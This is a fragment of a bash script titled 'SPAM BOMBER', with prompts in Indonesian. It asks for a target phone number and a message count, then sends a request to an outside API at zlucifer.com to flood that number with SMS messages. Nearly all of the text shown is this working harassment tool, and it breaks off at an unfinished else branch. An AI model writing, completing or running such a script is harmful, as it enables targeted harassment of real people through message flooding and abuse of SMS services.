get_sms=$(curl -s http://zlucifer.com/api/sms.php)
echo -e figlet "SPAM BOMBER" 
            #function spam
            echo
            echo $red "Silahkan masukan nomor telp target"
            echo $blue "contoh 0812345678"
            read target # masukin no telp
            echo
            echo $purple "Berapa sms yang mau dikirim?"
            read paket
            echo
            echo Apakah nomor $target "dan SMS dikirim "$paket" sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    clear
                    echo Melakukan spam SMS ke nomor $target
                    echo
                    echo "Jangan close aplikasi sebelum spam selesai" 
                    echo "========================================"
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
            else